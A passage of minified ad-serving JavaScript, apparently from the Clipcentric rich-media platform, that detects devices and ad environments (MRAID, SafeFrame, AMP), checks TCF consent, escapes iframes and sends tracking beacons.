"px"], null, "frame", "", 0, !1, null, !0, !0, "topleft", 0, -1, 0, 0, !1, null], [6890176479, 0, 0, 1024, 362, "independent", ["layer", 100, 1, 0, 9999, 0, "px", "keepaspect", 100, null, 0, 9999, 0, "px"], null, "frame", "", 0, !1, null, !0, !0, "topleft", 0, -1, 0, 0, !1, null], [6935766156, 25, 10, 20, 20, "original", null, null, "button", "", 3, !0, null, !0, !0, "topright", 0, 99, 0, 0, !1, null], [6958422490, 10, 10, 20, 20, "original", null, null, "same", "", 3, !0, null, !0, !0, "topleft", 0, 99, 0, 0, !1, null], null, null, null],
    Oa = "In-Page%20Unit expanded expanded collapsed collapsed video%20frame video%20frame Video Video replay%20button video%20event monitor monitor close%20button close%20button scroll%20action%20push jsfix css%20style".split(" "),
    tg = [null, [[0, 0, 1920, 350, "#ffffff", 0]], [[0, 0, 1024, 512, "#ffffff", 0]], [[0, 0, 1920, 120, "#ffffff", 0]], [[0, 0, 1024, 150, "#ffffff", 0]], [[0, 0, 290, 164, "#ffffff", 0]], [[0, 0, 240, 141, "#ffffff", 0]], [[0, 0, 480, 270, "#ffffff", 0]], [[0, 0, 480, 270, "#ffffff", 0]], null, null, null, null, null, null, null, null, null],
    ra = [],
    Kd = "http:" === B.location.protocol ? "http://" : "https://",
    Ld = Kd + "clipcentric-a.akamaihd.net/user-10/resources/",
    Ga = navigator.userAgent || navigator.vendor || v.opera,
    Sf = /(Trident|MSIE)/.test(Ga),
    mc = /(Firefox|FxiOS)/i.test(Ga),
    xd = /\bEdge\//.test(Ga),
    mg = /(Chrome|CriOS)/.test(Ga) && !xd,
    Je = /\bVersion.*Safari/.test(Ga) && !xd,
    Uc = !!navigator.sendBeacon,
    bb,
    Z,
    U,
    ug,
    Ke,
    Md,
    sc,
    ob,
    Le,
    vg,
    ue,
    sb,
    Vc,
    Me,
    Y,
    ea,
    Nd,
    Wb = 1,
    J = v.cc1722688,
    Wc,
    cb,
    Od = [],
    Xc = [],
    wg,
    xg = RegExp("^(in|im|ai|fi|ni|ii|li|si|mi|vi|wi|hi|ct)"),
    Zh = RegExp("^(cl|ce|la|er)"),
    $h = RegExp("^v(impression|play|pause|rewind|mute|fullscreen|progress)"),
    Pd = [],
    Ne = [],
    za,
    Fb = [],
    Qd = [],
    O = [],
    Yc = [],
    S = [],
    Rd = [],
    Sd = [],
    Td = [],
    Oe = [],
    Wa = {},
    Zc = {},
    $c = 0,
    Ud,
    yg,
    tc,
    zg,
    Ag,
    Bg,
    Vd,
    Cg,
    Wd,
    Xd,
    ua = -1,
    db,
    Pe,
    Qe,
    Re,
    Fa,
    Aa,
    L,
    V,
    Yd,
    tb,
    Dg,
    Xb,
    ad,
    Eg,
    Zd,
    $d,
    Gb,
    bd,
    uc,
    ae = [],
    cd,
    vc,
    be,
    ce,
    ja,
    oa,
    Fg,
    wc,
    wa,
    Gg,
    Yb,
    dd,
    Se = 0,
    Te = 0,
    Ue,
    xc,
    yc = 0,
    ed = -1,
    Ve = !1,
    We,
    Mb = !1,
    Nb,
    Xe,
    vd,
    jb,
    Hb = [],
    Zb = [],
    zc = [],
    Ye,
    Ze,
    fd = [],
    de,
    gd,
    R,
    pa,
    ee,
    hd = 0,
    $e,
    $b = [],
    id = [],
    jd,
    ub,
    vb,
    Xa,
    Hg,
    kd,
    ac,
    bc,
    Qa = {},
    kc,
    ld = [],
    xa,
    $a,
    Ib,
    Ig,
    Jg,
    cc,
    Ac = [],
    Kg,
    Ha = [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17],
    ai = [8191, 2731, 5460, 2731, 5460, 2731, 5460, 2731, 5460, 8191, 8191, 2731, 5460, 2731, 5460, 8191, 8191, 8191],
    kb = [, [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17], [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17],, [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17],,,, [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17]];
  kb[16] = [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17];
  kb[32] = [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17];
  kb[64] = [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17];
  kb[128] = [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17];
  kb[256] = [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17];
  kb[512] = [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17];
  kb[1024] = [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17];
  kb[2048] = [0, 1, 1, 3, 3, 5, 5, 7, 7, 9, 10, 11, 11, 13, 13, 15, 16, 17];
  kb[4096] = [0, 2, 2, 4, 4, 6, 6, 8, 8, 9, 10, 12, 12, 14, 14, 15, 16, 17];
  var Jb = [],
    fi = function () {
      var a, b, c, e;
      jb = !0;
      for (a = 0; 17 >= a; a++) O[a] = [], O[a][19] = [], O[a][20] = [], Yc[a] = [], Yc[a][1] = 0, Yc[a][2] = 0;
      D(1)[2] = Da[1].loadCount;
      D(3)[2] = Da[3].loadCount;
      if (bb) {
        bi();
        if ((L = v.mraid) || v.MRAID_ENV) try {
          V = L ? L.getState() : "loading";
          if ("loading" === V) {
            L && L.addEventListener("ready", fe);
            var d = lb("FAAMn_tofiMyARDIoLdade");
            v[d] && (e = !0);
            if (!e) {
              var f = B.querySelectorAll("script");
              for (c = 0; c < f.length; c++) if ("mraid.js" === f[c].getAttribute("src")) {
                e = !0;
                break;
              }
            }
            if (!e) {
              var g = B.createElement("script");
              g.type = "text/javascript";
              g.src = "mraid.js";
              g.onload = g.onerror = function () {
                V = (L = v.mraid) && L.getState();
                "loading" === V ? L.addEventListener("ready", fe) : V && fe();
              };
              I(B.head, g);
            }
          } else fe();
          if (Eg = v.MRAID_ENV && /Google/i.test(v.MRAID_ENV.sdk)) if (d = lb("FAAMG_teoCtnneHtiehgt"), v[d] ? (Zd = !0, $d = v[d], v[d] = ge) : Object.defineProperty(v, d, {
            get: function () {
              return ge;
            },
            set: function (t) {
              Zd = !0;
              $d = t;
            }
          }), d = lb("oggoeldAJsIstnreafec"), v[d] && v[lb("oggoelc_sam")]) {
            Zd = !0;
            uc = v[d];
            v[d] = {};
            for (b in uc) v[d][b] = uc[b];
            v[d].notify = ci;
          }
          try {
            /(nexus|xandr)/i.test(L.getVendor());
          } catch (t) {}
          sc = !0;
          M(ma, "touchstart", function () {});
          ma.style.margin = "0px";
          ma.style.overflow = "hidden";
          (B.scrollingElement || (Ie ? ma : Va)).scrollTop = 0;
        } catch (t) {}
        if (!V) try {
          var k = v.$sf;
          if (!k && (k = v.parent.$sf)) {
            var h = v.parent.document;
            var l = h.createElement("style");
            I(l, h.createTextNode(""));
            I(h.head, l);
            l.sheet.insertRule("html,body{width:100%;height:100%}", 0);
            v.frameElement.width = "100%";
            v.frameElement.height = "100%";
          }
          if (oa = k && k.ext) {
            di();
            xc = oa.meta("is_amp");
            wb();
            af();
            md();
            he();
            var m = S[0];
            var n = Ya(m, !1);
            var p = Math.min(n.width || self.innerWidth, self.innerWidth);
            var r = Math.min(n.height || self.innerHeight, self.innerHeight);
            Yb = self.innerWidth;
            dd = self.innerHeight;
            oa.register(p, r, Lg);
            Fg = oa.supports() || {};
          }
        } catch (t) {
          oa = null, xc = !1;
        }
        V || oa || top === self || !v.AMP_CONTEXT_DATA || (xc = !0);
      }
      if (bb && top !== self && !V && (d = oa || xc ? !1 : !0, J.nobust && (d = !1), J.bust && (d = !0), d && ei())) return;
      Mg();
    },
    Mg = function () {
      Eb = xc ? "a" : oa ? "s" : V ? "m" : top !== v ? "i" : "w";
      var a;
      if (/^c/.test(J.privacy) && "gdpr" !== Fe) kd = ac = bc = !0, Qa.a = 4, bf(), ie();else {
        try {
          if (top.__tcfapi) {
            top.__tcfapi("addEventListener", 2, cf);
            var b = !0;
          }
        } catch (e) {}
        if (!b) {
          for (a = self; a;) {
            try {
              if (a.frames.__tcfapiLocator) {
                var c = a;
                break;
              }
            } catch (e) {}
            if (a === top) break;
            a = a.parent;
          }
          c && (b = !0, self.addEventListener("message", cf, !1), a = {
            __tcfapiCall: {
              command: "addEventListener",
              version: 2,
              callId: Tc
            }
          }, c.postMessage(a, "*"));
        }
        b || (kd = !0, Ng(), bf(), ie());
      }
    },
    ie = function () {
      var a, b, c;
      if (kd) if (bc) {
        if (!cc && (1 !== U && (a = V && (!tb || !Yd)), a)) {
          na("in");
          Dg = !0;
          for (b = 0; 17 >= b; b++) je(b);
          return;
        }
        cc = !0;
        gi();
        af();
        Ac.push([Og]);
        Ue = 0 < (U & 390) && 13 > ob && top !== v;
        Wc = df(J.dest);
        cb = Bc(J.click);
        var e = J.view.concat();
        for (a = 0; a < e.length; a++) if (c = Bc(e[a])) Od.push(c);else {
          a: {
            c = e[a];
            try {
              var d = c;
              c = "string" === typeof d ? d.replace(/^\s+|\s+$/g, "") : "number" === typeof d ? d + "" : "";
              if (/^<(.|\s)+\/\/(.|\s)+>$/.test(c)) {
                b = c;
                break a;
              }
            } catch (f) {}
            b = "";
          }
          b && Xc.push(e[a]);
        }
        cb = dc(cb);
        if (Aa) {
          if (bb) {
            ra[1] && (b = Aa.style, ra[2] = b.position, ra[3] = b.opacity, ra[4] = b.zIndex, ra[5] = b.pointerEvents, ra[6] = b.top, ra[7] = b.left, Aa.parentNode !== Aa.offsetParent && (ra[11] = Aa.parentNode.style.position, Aa.parentNode.style.position = "relative"), b.opacity = .001, b.zIndex = -2, b.pointerEvents = "none", b.top = b.left = "0px", b.position = "absolute");
            M(v, "orientationchange", ef);
            try {
              M(screen, "mozorientationchange", ef);
            } catch (f) {}
            0 === (Z & 391) && M(v, "scroll", hi);
            wb();
            Wd = Y;
            Xd = ea;
            0 < (U & 1) ? Ac.push([Pg, Va, !0]) : M(v, "resize", xb);
            0 < (U & 390) && ff(Y, 0);
            md();
            b = Fa && Fa.src.substr(0, 30) || "";
            Ig = /gdn/.test(b);
            Jg = /ibm/.test(b);
            b = V || mc || Je || 0 < (U & 390) ? 2 : 4;
            a = J.privacy || J.storage;
            e = J.gdpr;
            ac ? /^(s|c):/.test(a) ? (a = a.split(":"), "0" == a[2] ? xa = 1 : (xa = 0, xa |= /^1/.test(a[2]) ? 2 : b, xa |= /c$/.test(a[2]) ? 8 : 16)) : xa = "0" === a ? 1 : "0p" === e ? 1 : "1p" === e ? 18 : b | 16 : xa = 1;
            Ig && 1 !== xa && (xa &= -17, xa |= 8, xa &= -3, xa |= 4);
            1 === xa || xa & 2 ? Vc = !0 : xa & 4 && (b = "u=cc1722688&t=" + encodeURIComponent(rc + ec(!0)), xa & 8 && (b += "&uc=1"), b += "&i=1", Me = !0, sb = B.createElement("iframe"), sb.width = sb.height = "1", sb.style.cssText = "position:absolute;visibility:hidden;pointer-events:none;width:1px;height:0px;left:0px;margin:0px;padding:0px;border-width:0px", sb.src = "https://ad.clipcentric.com/user-10/resources/store.phtml?v231030#" + b, M(sb, "load", ii), b = Aa.parentNode, Ac.push([I, b, sb]));
            gf(1);
            ji();
            he();
            for (b = 0; 17 >= b; b++) hf(b);
            a = S[0];
            try {
              za = z(a)[0], Qg();
            } catch (f) {}
            na("in,im,fi");
            ki();
            e = [1, 2, 5, 6, 7, 8, 11, 12, 15, 16, 17];
            Kb = 11;
            for (a = 0; a < e.length; a++) b = e[a], Rg(b, !0) ? 0 < (D(b)[1] & 34) ? 11 > a && Kb-- : (11 > a && (jf[ca(b)] = !0), je(b)) : 11 > a && Kb--;
            0 === Kb && (Kb--, kf(0, 0));
          } else na("in,im,ai"), za = hf(S[0]), Qg();
          "object" === typeof J && (J._m = za, J._m.setAttribute("data-cc-id", 1722688));
        } else na("er:1");
        Sg();
      } else na("in,ni");
    },
    Sg = function () {
      if (0 < Ac.length) {
        var a = Ac.shift();
        v.ccAnimate(function (b) {
          return function () {
            Sg();
            if (0 < b.length) b[0].apply(null, b.slice(1));else b[0]();
          };
        }(a));
      }
    },
    Og = function () {
      if (!Hg && (Xa || V)) {
        Hg = !0;
        var a = document;
        var b = a.createElement("iframe");
        b.scrolling = "no";
        b.frameBorder = "0";
        var c = b.style;
        c.position = "absolute";
        c.zIndex = -2;
        c.opacity = .001;
        c.top = c.left = "0px";
        c.width = c.height = "100%";
        c.pointerEvents = "none";
        b.src = Ld + "ad.html#fid=1722688";
        I(Fa.parentNode, b, Fa.nextSibling);
        for (b = 0; 2 > b; b++) c = (0 === b ? a.documentElement : a.body).style, c.padding = c.margin = "0px", c.width = c.height = "100%";
        c = a.querySelector(lb("G.oolgAetcviVeeiEwelemtn"));
        b = a.querySelector(lb("G.oolgAetcviVeeiIwnnreoCtniaenr"));
        if (c || b) if (c && (c.style.display = "inline-block", c.style.width = c.style.height = "100%"), "complete" !== a.readyState) try {
          self.dispatchEvent(new Event("load"));
        } catch (e) {}
      }
    },
    ke = function () {
      if (Dg && !cc) {
        cc = !0;
        Vb = Ka();
        ie();
        var a = D(0);
        var b = S[0];
        0 < (a[1] & 32) && "canvas" === yb(b) && (Ya(b, !0), Mc(b));
      }
    },
    li = function () {
      var a;
      void 0 !== B.hidden ? a = "visibilitychange" : void 0 !== B.msHidden ? a = "msvisibilitychange" : void 0 !== B.webkitHidden && (a = "webkitvisibilitychange");
      return a;
    },
    Pg = function (a, b, c) {
      var e;
      for (e = 0; e < $b.length; e++) if ($b[e][0] === a) return;
      var d = mi;
      e = ni;
      c && (d = oi, e = pi);
      if (!b) try {
        var f = new ResizeObserver(d);
        f.observe(a);
        $b.push([a, null]);
        id.push(f);
        return;
      } catch (g) {}
      b = B.createElement("iframe");
      b.scrolling = "no";
      0 < (U & 390) ? (c = "min-", b.width = b.height = 1) : c = "";
      b.style.cssText = c + "height:95%;" + c + "width:95%;top:-100%;left:-100%;margin:0px;padding:0px;border-width:0px;position:absolute;background-color:transparent;z-index:-9999;pointer-events:none";
      I(a, b);
      c = b.contentWindow;
      f = c.document;
      f.open("text/html", "replace");
      f.write("<html><head><style>html,body{height:100%;overflow:hidden}</style></head><body></body></html>");
      f.close();
      $b.push([a, b]);
      M(c, "resize", e);
    },
    mi = function (a, b) {
      sa(Ag);
      Ag = la(xb, 10);
    },
    ni = function (a) {
      a = a.target;
      var b = a.document.documentElement,
        c = b.clientWidth;
      b = b.clientHeight;
      if (c !== a.ccw || b !== a.cch) a.ccw = c, a.cch = b, xb();
    },
    lf = function (a) {
      if (!gd && jb) {
        gd = !0;
        a = ub;
        var b = vb;
        md();
        if (a !== ub || b !== vb) wb(), le();
        sa(Vd);
        Vd = la(Tg, 1);
      }
    },
    oi = function (a, b) {
      sa(Cg);
      Cg = la(lf, 10);
    },
    pi = function (a) {
      a = a.target;
      var b = a.document.documentElement,
        c = b.clientWidth;
      b = b.clientHeight;
      if (c !== a.ccw || b !== a.cch) a.ccw = c, a.cch = b, lf();
    },
    cf = function (a, b) {
      var c = {};
      if (!kd) {
        if (a.data) try {
          var e = "string" === typeof a.data ? JSON.parse(a.data) : a.data;
          var d = e.__tcfapiReturn || {};
          if (d.callId !== Tc) return;
          c = d.returnValue || {};
          var f = d.success;
        } catch (l) {} else b && (c = a, f = b);
        if (f) try {
          if (Qa.i = c.cmpId, Qa.v = c.cmpVersion, Qa.t = c.tcfPolicyVersion, void 0 !== c.gdprApplies) if (Qa.a = c.gdprApplies ? 1 : 0, c.gdprApplies) {
            if (/(lo|co)/.test(c.eventStatus)) {
              var g = !0;
              mf(c, 1) && (ac = !0);
              var k = mf(c, 2);
              var h = mf(c, 7);
              k && h && (bc = !0);
            }
          } else bc = ac = g = !0;
        } catch (l) {
          g = !0, Qa.e = 1, Ng();
        }
        g && (kd = !0, self.removeEventListener("message", cf, !1), bf(), ie());
      }
    },
    mf = function (a, b) {
      var c, e;
      (c = (c = a.publisher && a.publisher.restrictions) && c[b]) && (e = c[319]);
      void 0 === e && (e = "_");
      Qa["p" + b] = [e, a.purpose.consents[b] ? 1 : 0, a.vendor.consents[319] ? 1 : 0, a.purpose.legitimateInterests[b] ? 1 : 0, a.vendor.legitimateInterests[319] ? 1 : 0].join("");
      return 0 != e && (a.purpose.consents[b] && a.vendor.consents[319] && 2 != e || a.purpose.legitimateInterests[b] && a.vendor.legitimateInterests[319] && 1 != e) ? !0 : !1;
    },
    Ng = function () {
      var a = J.privacy || J.storage;
      "gdpr" === Fe ? (Qa.a = 2, /^.:d/.test(a) ? bc = ac = !1 : (ac = !1, bc = !0)) : (Qa.a = 3, bc = ac = !0);
    },
    bf = function () {
      var a = [];
      Qa.r = Fe || "n";
      for (b in Qa) Qa.hasOwnProperty(b) && a.push(b + ":" + Qa[b]);
      a.sort();
      var b = "https://tr.clipcentric.com/s/" + rc + ec() + "/TCF=" + a.join(",") + "/E=tcf";
      Uc ? navigator.sendBeacon(b, "") : (a = new Image(), a.src = b);
    },
    ii = function (a) {
      if (!Vc && (Vc = !0, Vc)) {
        for (a = 0; a < ld.length; a++) {
          var b = ld[a];
          2 === b[0] && gf(b[1], b[2]);
        }
        ld = [];
      }
    },
    gf = function (a, b) {
      var c,
        e = [];
      if (Vc) {
        if (1 === a) {
          if (Me) return;
          Me = !0;
          var d = rc;
        }
        if (2 === a) {
          if (Ug[b]) return;
          Ug[b] = !0;
          d = me[b];
        }
        if (xa & 2) {
          var f = Math.round(Ka() / 1E3);
          b = {
            i: Tc,
            u: Ta,
            d: Ua
          };
          d += ec(!0);
          var g = d.split("/");
          for (c = 0; c < g.length; c++) {
            var k = g[c].split("=", 2);
            b[k[0].toLowerCase()] = k[1];
          }
          if (b.f) {
            k = "f c p a l v fc fp fl fr cp cl pa pl pv al av lv".split(" ");
            g = Ih("cc-f") || {};
            var h = [];
            for (q in g) {
              var l = g[q];
              c = f - l[0];
              7776E3 < c ? delete g[q] : (c = l[1], h.push(c));
            }
            for (c = 0; c < k.length; c++) {
              var m = k[c];
              var n = m.length;
              var p = [];
              var r = !0;
              for (l = 0; l < n; l++) {
                var t = m.substr(l, 1);
                if (b[t]) p.push(t + b[t]);else {
                  r = !1;
                  break;
                }
              }
              if (r) {
                var q = p.join(".");
                if (q in g) {
                  if (l = g[q], 2 !== a || 0 <= m.indexOf("f")) l[1] = f, l[2]++;
                } else g[q] = l = [], l[0] = f, l[1] = f, l[2] = 1;
                e.push(m + "." + l[2]);
              }
            }
            if (50 < h.length) for (q in h.sort(function (x, w) {
              return x - w;
            }), c = h[50], g) l = g[q], l[1] >= c && delete g[q];
            Jh("cc-f", g);
            0 < e.length && (a = "https://tr.clipcentric.com/s/" + d + "/Q=" + e.join("_") + "/E=fq", d = new Image(), d.src = a);
          }
        } else if (xa & 4) try {
          1 === a && (f = "i", sb.contentWindow.postMessage(f, "*")), 2 === a && (f = "v:" + me[b] + ec(), sb.contentWindow.postMessage(f, "*"));
        } catch (x) {}
      } else ld.push([2, a, b]);
    },
    Qg = function () {
      var a;
      var b = Aa.parentNode;
      "HEAD" === b.nodeName ? b = ma : a = Aa.nextSibling;
      if (b && za) {
        if (V) {
          var c = za.style;
          c.marginLeft = "calc(50vw - " + parseInt(c.width) / 2 + "px)";
        }
        I(b, za, a);
        Ac.push([Pg, b, !1, !0]);
      }
    },
    Vg = function (a, b) {
      var c, e, d;
      if (!a) {
        try {
          if (self.frameElement.ownerDocument.defaultView === top) return self.frameElement;
        } catch (k) {}
        a = top;
      }
      var f = a.frames;
      for (c = 0; c < f.length; c++) {
        if (a === top) {
          b = null;
          try {
            f[c].frameElement && (b = f[c].frameElement);
          } catch (k) {}
          if (!b) try {
            var g = top.document.getElementsByTagName("IFRAME");
            for (e = 0; e < g.length; e++) if (g[e].contentWindow === f[c]) {
              b = g[e];
              break;
            }
          } catch (k) {}
        }
        try {
          if (f[c] === self) return b;
        } catch (k) {}
        try {
          if (d = Vg(f[c], b)) return d;
        } catch (k) {}
      }
    },
    qi = function () {
      var a = function () {
        bb = !1;
        Mg();
      };
      if (!Fa || Fa.getAttribute("ccif") || "unknown" === Ta || Kd !== He && "http://" !== Kd) a();else {
        var b = He + Ta + "/clipcentric/cciframe.html";
        var c = Za("clipcentric-a.akamaihd.net/cciframe/u?") + encodeURIComponent(b);
        var e = new Image();
        e.onload = function () {
          var d = B.createElement("iframe");
          d.scrolling = "no";
          var f = d.style;
          f.padding = "0px";
          f.margin = "0px";
          f.borderWidth = "0px";
          f.overflow = "hidden";
          f.display = "block";
          f.width = "100vw";
          f.height = "100vh";
          b += "#src=" + encodeURIComponent(Fa.getAttribute("src")) + "&ccif=1&id=ccfid1722688";
          if ("object" === typeof J) try {
            b += "&ccex=" + encodeURIComponent(encodeURIComponent(JSON.stringify(J)));
          } catch (g) {}
          d.setAttribute("src", b);
          I(Fa.parentNode, d, Fa.nextSibling);
        };
        Og();
        e.onerror = a;
        e.src = c;
      }
    },
    ei = function () {
      if (/(creative-preview-an)/.test(self.location.host)) return !1;
      try {
        if (top.alert) return v = top, B = v.document, ma = B.body, Va = B.documentElement, Ie = "BackCompat" === B.compatMode, nf(), ra[0] = Aa = Vg(), ra[1] = !0, !1;
        throw "x";
      } catch (a) {
        if ("object" !== typeof J || !J.nocciframe) return qi(), !0;
      }
      return bb = !1;
    },
    ri = function (a, b) {
      for (var c = "ccjp", e = 0; "undefined" !== typeof v[c + e];) e++;
      c += e;
      v[c] = b;
      Pd.push(c);
      b = B.createElement("script");
      b.type = "text/javascript";
      b.id = c;
      b.src = Za(a);
      I(B.head, b);
    },
    je = function (a, b) {
      var c = D(a);
      if (!(0 < (c[1] & 34))) if (c[1] |= 2, c[3] = b, b = ca(a), a = yb(a), 2 === b || 4 === b) wd(b, fa[b][9], !0);else if ("canvas" === a) Nh(b);else if ("button" === a) {
        if (c = pc[b]) c.onUrl && wd(b, c.onUrl, !0, !1), c.offUrl && wd(b, c.offUrl, !0, !1), c.onUrl || c.offUrl || Lc(b), c.hOnUrl && (b = new Image(), b.src = c.hOnUrl), c.hOffUrl && (b = new Image(), b.src = c.hOffUrl);
      } else c[2] || Lc(b);
    },
    of = !1,
    wd = function (a, b, c, e) {
      var d = new Image();
      b = Za(b);
      var f = D(a);
      c && (c = f[2], f[2] = c ? c + 1 : 1);
      e && (d.crossOrigin = "anonymous");
      d.onload = d.onerror = function () {
        of = !0;
        var g = d.lid,
          k = D(g);
        d.onload = d.onerror = null;
        k[2]--;
        0 === k[2] && Lc(g);
        of = !1;
      };
      d.lid = a;
      d.src = b;
      return d;
    },
    Lc = function (a) {
      var b = D(a),
        c = b[1],
        e = S[a];
      b[1] = 32;
      if (b[3]) b[3](a);
      cc && (0 === Ha[a] && "canvas" === yb(e) && (Ya(e, !0), Mc(e)), 0 < (c & 4) && (b = R, 0 < (c & 16) && (R = !0), Sa(e, 2, 0 < (c & 8)), R = b), jf[a] && (jf[a] = !1, Kb--, 0 === Kb && (Kb--, kf(Ka() - Vb, 0))));
    },
    Kb,
    jf = [],
    kf = function (a, b) {
      var c = [1, 2, 5, 6, 7, 8, 11, 12, 15, 16, 17],
        e = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      xb();
      if (0 === b) {
        var d = 0;
        b = 11;
      } else d = 1 === b ? 11 : 0, b = c.length;
      for (a = 0; d < b; d++) 0 >= e[d] ? Sa(c[d], 2) : O[c[d]][19].push(Wg(Sa, e[d] - a, c[d], 2));
    },
    pf = function (a) {
      for (a = 1; 17 >= a; a++) {
        try {
          va(a, 2);
        } catch (b) {}
        O[a][4] = !1;
      }
      a = S[0];
      "canvas" === yb(a) && (Uf(a), Mc(a));
      kf(0, 2);
    },
    Bc = function (a) {
      try {
        if (/^(https?|data):/i.test(a)) return a;
      } catch (b) {}
      return "";
    },
    df = function (a) {
      try {
        if (/^\w+:\/\//.test(a)) return a;
      } catch (b) {}
      return "";
    },
    dc = function (a) {
      try {
        a = a.replace(/(%%CACHEBUSTER%%|\[timestamp\])/ig, Ka()), a = a.replace(/%%([\w:]*?)%%/g, function (b, c) {
          return Cc(c);
        }), a = a.replace(/%25%25([\w:]*?)%25%25/g, function (b, c) {
          return Cc(c);
        }), a = a.replace(/%(\w*?)(!|%21)/g, function (b, c) {
          return Cc(c);
        }), a = a.replace(/\[\[\[(\w*?)\]\]\]/g, function (b, c) {
          return Cc(c);
        }), a = a.replace(/%5b%5b%5b(\w*?)%5d%5d%5d/ig, function (b, c) {
          return Cc(c);
        }), a = a.replace(/\[(sas_\w*?)\]/ig, function (b, c) {
          return Cc(c);
        }), a = a.replace(/\[PAGEURL\]/g, encodeURIComponent("https://" + Ta)), a = a.replace(/%%/g, "%25%25");
      } catch (b) {}
      return a;
    },
    Cc = function (a) {
      "PATTERN:url" === a ? a = "host" : a && (a = a.replace(/^PATTERN:/, ""));
      return J[a] && !/^%/.test(J[a]) ? encodeURIComponent(J[a]) : "";
    },
    Xg = function (a) {
      var b;
      bb = !0;
      ma = B.body;
      Va = B.documentElement;
      !ma && 5E3 > a ? la(Xg, 1, a + 1) : (nf(), ob = 0 < (Z & 390) && (b = Ga.match(/OS ([\d|_]+)/)) ? parseFloat(b[1].replace("_", ".")) : 0, vg = Je && (b = Ga.match(/Version\/(\d+)/)) ? parseInt(b[1]) : 0, 0 < (Z & 6) && 0 === ob && (ob = vg), Le = mg && (b = Ga.match(/\b(Chrome|CriOS)\/(\d+)/i)) ? parseInt(b[2]) : 0, ue = mc && (b = Ga.match(/\bFirefox\/(\d+)/i)) ? parseInt(b[1]) : 0, $a = v.devicePixelRatio || 1, 2 < $a && ($a /= 2), Sf || 0 < (Z & 1560) && mc && 25 > ue ? bb = !1 : (Md = RegExp("Android.+Firefox", "i").test(Ga), sc = 1 === U || 0 < (U & 390) && 10 <= ob || 0 < (U & 1560) && (53 <= Le || mc), v.CanvasRenderingContext2D || (bb = !1)), fi());
    },
    nf = function () {
      var a;
      Ke = (a = (screen.orientation || {}).type || screen.mozOrientation) && 0 === (U & 390) ? /land/.test(a) ? 2 : 1 : void 0 !== v.orientation ? 90 == Math.abs(v.orientation) ? 2 : 1 : 2;
      a = /android/i.test(Ga);
      var b = /ip(hone|od|ad)/i.test(Ga);
      var c = 2 === Ke;
      /\bsilk\b/i.test(Ga) ? (a = !0, Z = c ? 8 : 16, Ua = "t") : /(android|bb\d+|meego).+ mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(Ga) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g 